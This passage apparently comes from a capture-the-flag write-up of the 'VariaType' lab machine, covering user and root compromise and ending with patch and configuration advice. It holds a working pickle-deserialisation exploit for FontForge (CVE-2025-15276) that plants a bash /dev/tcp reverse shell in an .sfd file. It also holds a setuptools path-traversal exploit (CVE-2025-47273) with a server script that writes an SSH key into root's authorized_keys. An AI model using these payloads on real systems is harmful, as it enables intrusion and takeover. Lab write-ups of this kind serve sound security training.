    family = getattr(font, 'familyname', 'Unknown')                                                                                              
    style = getattr(font, 'fontname', 'Default')                                                                                                 
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)                                                                                   
    font.close()                                                                                                                                 
except Exception as e:                                                                                                                           
    print(f'ERROR: Failed to process variabype_87uFFwU4fmY.ttf: {e}', file=sys.stderr)                                                           
    sys.exit(1)                                                                                                                                                                                                                                                                              
2026/06/14 14:30:02 CMD: UID=1000  PID=37721  | /bin/bash /home/steve/bin/process_client_submissions.sh 
```

**UID=1000** is `steve`. A cron job running as `steve` invokes `/home/steve/bin/process_client_submissions.sh` every minute. This script processes font files from the upload directory by running `fontforge` on each one. If a file placed in the upload directory triggers FontForge, we have a code execution path into `steve`'s account.

### Analysing the Bash Pipeline Script (process_client_submissions.sh)

The script itself is not readable by `www-data`, but a backup copy exists at `/opt/process_client_submissions.bak`:

```shell
www-data@variatype:/tmp$ cat /opt/process_client_submissions.bak 
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```

**Script breakdown:**
- `UPLOAD_DIR` — The script operates on `/var/www/portal.variatype.htb/public/files`, which is the same directory where uploaded fonts land and where `www-data` has write access.
- `EXTENSIONS` — The script processes several font formats including **`*.sfd`** (Spline Font Database — FontForge's native format). This is the critical attack surface.
- `SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'` — Filenames are validated against this strict regex (letters, digits, dots, hyphens, underscores only). A filename like `exploit.sfd` passes this check.
- `fontforge.open('$file')` — The Python code passed to FontForge via `-c` **directly interpolates** the filename into the command string without quoting, creating a potential injection point — but the filename regex prevents this specific vector. However, the vulnerability is in FontForge's SFD parser, not the script itself.
- `timeout 30` — The job has a 30-second execution window, which is enough time for a reverse shell to connect.

The FontForge version running on the server:

```
www-data@variatype:/tmp$  /usr/local/src/fontforge/build/bin/fontforge --version
Copyright (c) 2000-2025. See AUTHORS for Contributors.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 with many parts BSD <http://fontforge.org/license.html>. Please read LICENSE.
 Version: 20230101
 Based on sources from 2025-12-07 11:44 UTC-D.
 Based on source from git with hash: a1dad3e81da03d5d5f3c4c1c1b9b5ca5ebcfcecf
fontforge 20230101
build date: 2025-12-07 11:44 UTC
```

**FontForge version 20230101** is vulnerable to CVE-2025-15276.

### Technical Deep Dive — CVE-2025-15276

**Affected Versions:** FontForge ≤ 20230101  
**CVSS Score:** 7.8 (High)  
**Type:** CWE-502 — Deserialization of Untrusted Data  
**Reference:** [ZDI-25-1187](https://www.zerodayinitiative.com/advisories/ZDI-25-1187/) / [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-15276)

FontForge's native file format is **SFD (Spline Font Database)**, a text-based format that stores complete font data including glyph outlines, kerning tables, and metadata. CVE-2025-15276 arises from a `PickledData` field in the SFD format.

**The SFD `PickledData` field:**

FontForge's SFD parser recognises a `PickledData` keyword, which is intended to store arbitrary Python-serialised data alongside a font for round-tripping Python FontForge script state. When FontForge opens an SFD file, it reads this field and **deserialises the data using Python's `pickle` module** without any validation.

Python's `pickle` is a serialisation format that can encode **arbitrary Python objects**, including those with custom `__reduce__` methods. The `__reduce__` method controls how an object is reconstructed during deserialisation — it can return any callable and its arguments, including `os.system()` with a shell command string.

This means any `.sfd` file placed in a location where FontForge will open it can trigger arbitrary OS command execution in the context of the FontForge process — in this case, `steve`'s cron job running as UID 1000.


### SFD Exploit Script — cve_2025_15276.py

The exploit script generates the malicious `.sfd` file. Credit to [ahmedreda38](https://github.com/ahmedreda38/CVE-2025-15276-poc/blob/main/CVE-2025-15276-rce.py) for the original PoC:

```python
import os
import pickle

LHOST = "10.10.17.34"
LPORT = "5555"

# Reverse shell payload
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

class Exploit(object):
    def __reduce__(self):
        # __reduce__ controls deserialization: when pickle.loads() is called on this object,
        # it calls os.system(cmd). This is the standard Python pickle RCE technique.
        # os.system() executes the shell command in a subprocess.
        return (os.system, (cmd,))

# pickle.dumps() serializes the Exploit instance to binary pickle format.
# Protocol 0 produces ASCII-compatible output (older pickle protocol),
# which is safe to embed in the SFD text format without binary corruption.
payload = pickle.dumps(Exploit(), protocol=0).decode('ascii')

# SFD format requires backslashes and double-quotes to be escaped
escaped_payload = payload.replace('\\', '\\\\').replace('"', '\\"')

# Construct a minimal but valid SFD file with the PickledData field
# SplineFontDB: 3.2 is the magic header FontForge uses to identify SFD files
# BeginChars/EndChars define the glyph table (0 glyphs here — minimal but parseable)
sfd_content = f"""SplineFontDB: 3.2
FontName: Exploit
FullName: Exploit
FamilyName: Exploit
Weight: Regular
Version: 001.000
PickledData: "{escaped_payload}"
BeginChars: 256 0
EndChars
EndSplineFont
"""

# Write directly to the upload directory that the cron job monitors
with open("/var/www/portal.variatype.htb/public/files/exploit.sfd", "w") as f:
    f.write(sfd_content)

print("[+] exploit.sfd generated successfully!")
print(f"[+] Payload: {cmd}")
```

**Key code elements:**
- `class Exploit(object)` with `__reduce__` — Python's pickle protocol invokes `__reduce__` when serialising an object. The returned tuple `(callable, args)` is called as `callable(*args)` during deserialisation. By returning `(os.system, (cmd,))`, deserialisation executes `os.system(cmd)`.
- `pickle.dumps(Exploit(), protocol=0)` — Protocol 0 uses only printable ASCII characters, making it safe to embed in SFD's text-based format without binary encoding issues.
- The `PickledData` field is written into a minimal SFD structure. FontForge's SFD parser reads this field and calls `pickle.loads()` on its value when opening the file.
- The output path `/var/www/portal.variatype.htb/public/files/exploit.sfd` is the upload directory monitored by the cron script.

After the cron job runs (within 1 minute), a reverse shell connection was received:

```shell
┌──(kali㉿kali)-[~/Pentesting/Tools]
└─$ ncat -lvnp 5555     
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.129.26.31:38648.
bash: cannot set terminal process group (37984): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/var/www/portal.variatype.htb/public/files$ 
```

The shell was stabilised using the same `script`/`stty` technique as before.

### User Flag

```shell
steve@variatype:/var/www/portal.variatype.htb/public/files$ cd ~
steve@variatype:~$ cat user.txt 
**************0607e4334c4c99ae9
```

---

## Privilege Escalation — root (CVE-2025-47273 — setuptools Path Traversal)

### Sudo Privilege Analysis

```shell
steve@variatype:~$ sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

`steve` can run `/opt/font-tools/install_validator.py` as `root` with no password, with any argument (the `*` wildcard). The script accepts a single URL argument.

### Analysing install_validator.py

```python
# /opt/font-tools/install_validator.py

#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex   # <-- VULNERABLE IMPORT

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    # Validates that the URL has http/https scheme and a netloc (hostname)
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    # PackageIndex is a setuptools class that handles downloading packages.
    # The download() method fetches a file from the given URL and saves it.
    # In setuptools < 78.1.1, the download destination is derived from the URL
    # filename WITHOUT properly validating that it stays within the intended dir.
    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    # Note: this check only rejects URLs with MORE than 10 slashes —
    # it does NOT block URL-encoded slashes (%2F), which is the bypass.
    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```

**Key observations:**
- `is_valid_url()` only checks that the URL has an `http`/`https` scheme and a non-empty hostname — it does not restrict what path the file is downloaded to.
- `plugin_url.count('/') > 10` attempts to block overly long paths, but it counts literal forward slashes in the URL, not URL-encoded `%2F` characters. The path traversal payload uses `%2F` encoding to bypass this check.
- `PackageIndex().download(plugin_url, PLUGIN_DIR)` — this is the vulnerable call. `PLUGIN_DIR` is the intended destination, but the `download()` method in setuptools < 78.1.1 does not enforce it (CVE-2025-47273).

The installed version was confirmed as vulnerable:

```shell
steve@variatype:~$ python3 -c "import setuptools; print(setuptools.__version__)"
78.1.0
```

### Technical Deep Dive — CVE-2025-47273

**Affected Versions:** setuptools < 78.1.1  
**Fixed in:** setuptools 78.1.1  
**Type:** CWE-22 — Path Traversal  
**Reference:** [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-47273) / [GitHub Advisory](https://github.com/pypa/setuptools/security/advisories)

The vulnerability lives inside `setuptools/package_index.py` in the `PackageIndex.download()` method. When this method downloads a file, it determines the local filename to save it as by extracting the last component of the URL path. The critical flaw is in how it then constructs the final destination path using Python's `os.path.join()`.

**Python's `os.path.join()` gotcha:**

From the Python documentation:

If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

This means:
```python
os.path.join("/tmp/download_dir", "/etc/passwd")  # Returns: "/etc/passwd"
```

The `tmpdir` component is completely discarded if the second argument is an absolute path (starts with `/`).

**The exploit:**

The `download()` method URL-decodes the filename component from the URL. If an attacker provides a URL like:

```
http://attacker.local/%2f%2f%2froot%2f.ssh%2fauthorized_keys
```

The URL-decoded filename becomes `/root/.ssh/authorized_keys` — an absolute path starting with `/`. When this is passed to `os.path.join(PLUGIN_DIR, "/root/.ssh/authorized_keys")`, the `PLUGIN_DIR` is discarded and the file is written to `/root/.ssh/authorized_keys`.

### Custom HTTP Server — server.py

The `PackageIndex.download()` method sends an HTTP GET request to the provided URL and writes the response body to the calculated local path. To exploit this, a custom HTTP server was written that serves the SSH public key **regardless of the requested path** — this is necessary because the path in the URL is the path traversal payload, not a real file path on the attacker's server:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class MinimalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Read the SSH public key from disk
        with open("root_ed25519.pub", "rb") as f:
            content = f.read()
        
        # Always respond 200 OK with the public key content,
        # regardless of what path was requested.
        # This is essential because the request path is the traversal payload
        # (e.g., /%2f%2f%2froot%2f.ssh%2fauthorized_keys), not an actual file.
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(content)
        print(f"[*] Served payload to {self.client_address[0]}")

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
print(f"[+] Server listening on port {port}...")
HTTPServer(('0.0.0.0', port), MinimalHandler).serve_forever()
```

**Server breakdown:**
- `BaseHTTPRequestHandler` is the base class for HTTP request handlers in Python's built-in `http.server` module. Subclassing it and implementing `do_GET` handles all `GET` requests.
- `self.send_response(200)` — sets the HTTP status line to `200 OK`.
- The `with open("root_ed25519.pub", "rb") as f` — reads the SSH public key file in binary mode. The content written to the response body will be written to `/root/.ssh/authorized_keys` by the vulnerable `download()` method.
- The handler ignores `self.path` entirely — any path requested gets the same key response.

### Exploiting CVE-2025-47273 to Write SSH Authorized Keys

**Step 1:** Generate a new ED25519 SSH key pair on the attacker machine:

```shell
┌──(kali㉿kali)-[~/…/Linux/VariaType/root/.ssh]
└─$ ssh-keygen -t ed25519 -f root_ed25519 -P ""  -N "" -C "root@variatype"
Generating public/private ed25519 key pair.
Your identification has been saved in root_ed25519
Your public key has been saved in root_ed25519.pub
The key fingerprint is:
SHA256:4Mgqs2k+Wdq6SAkCKw17x0K2RhNxOrCXW6x+etAwYnA root@variatype
Your identification has been saved in root_ed25519
```

**Step 2:** Start the custom HTTP server that serves the public key:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ python3 server.py
[+] Server listening on port 8000...
```

**Step 3:** Trigger the exploit — `sudo` runs the script as root, which calls `PackageIndex().download()` with the path traversal URL. The `%2f%2f%2froot%2f.ssh%2fauthorized_keys` URL-decodes to `///root/.ssh/authorized_keys`, which Python's `os.path.join` treats as an absolute path, writing the file there:

```shell
steve@variatype:/tmp$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.176:8000/%2f%2f%2froot%2f.ssh%2fauthorized_keys
2026-06-14 16:16:24,543 [INFO] Attempting to install plugin from: http://10.10.15.176:8000/%2f%2f%2froot%2f.ssh%2fauthorized_keys
2026-06-14 16:16:24,556 [INFO] Downloading http://10.10.15.176:8000/%2f%2f%2froot%2f.ssh%2fauthorized_keys
2026-06-14 16:16:24,973 [INFO] Plugin installed at: ///root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

The server log confirms the key was served:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ python3 server.py
[+] Server listening on port 8000...
10.129.26.134 - - [15/Jun/2026 01:16:24] "GET /%2f%2f%2froot%2f.ssh%2fauthorized_keys HTTP/1.1" 200 -
[*] Served payload to 10.129.26.134
```

The log line `Plugin installed at: ///root/.ssh/authorized_keys` confirms the file was written to the correct location.

### Root Flag

With the SSH public key installed as root's authorized key, a passwordless SSH login was performed:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ ssh -i root_ed25519 root@variatype.htb                      
The authenticity of host 'variatype.htb (10.129.26.134)' can't be established.
ED25519 key fingerprint is: SHA256:0Wqe+nNeYlUwY+F669ywmS9kPUMYXqJh5xxCxwyCapI
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'variatype.htb' (ED25519) to the list of known hosts.
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 14 16:18:27 2026 from 10.10.15.176
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)
root@variatype:~# cat root.txt 
**************978a0b0bcdfa932c4
```

Root flag captured. Complete system compromise achieved.

---

## Mitigations & Recommendations

### 1. Update fontTools to ≥ 4.60.2 (CVE-2025-66034)

**Action:** Upgrade fontTools immediately.

```bash
pip install --upgrade "fonttools>=4.60.2"
```

**Root Cause:** fontTools `varLib` did not validate the `filename` attribute of `<variable-font>` elements in `.designspace` files, allowing path traversal. Additionally, `labelname` CDATA content was not sanitised before being written to output font files. Both issues are patched in 4.60.2.

---

### 2. Update FontForge to a Version after 20230101 (CVE-2025-15276)

**Action:** Build or install a patched version of FontForge. Monitor [FontForge releases](https://github.com/fontforge/fontforge/releases) for security fixes.

**Root Cause:** FontForge's SFD parser called `pickle.loads()` on the `PickledData` field from user-supplied SFD files without any validation. Python pickle deserialisation of untrusted data is equivalent to arbitrary code execution.

---

### 3. Remove the Exposed .git Directory from the Web Server

**Action:** Configure Nginx to deny access to `.git/` and other version control directories:

```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

**Root Cause:** The `.git/` directory was publicly accessible on `portal.variatype.htb`, allowing full source code recovery using `git-dumper`. Even though directory listing was disabled, individual git object files were served via HTTP.

---

### 4. Update setuptools to ≥ 78.1.1 (CVE-2025-47273)

**Action:** Upgrade setuptools immediately.

```bash
pip install --upgrade "setuptools>=78.1.1"
```

**Root Cause:** `PackageIndex.download()` derived a destination filename from the URL without properly sanitising it. When the filename began with `/` (from URL-decoded `%2F`), Python's `os.path.join()` discarded the intended download directory and wrote to an absolute path controlled by the attacker.


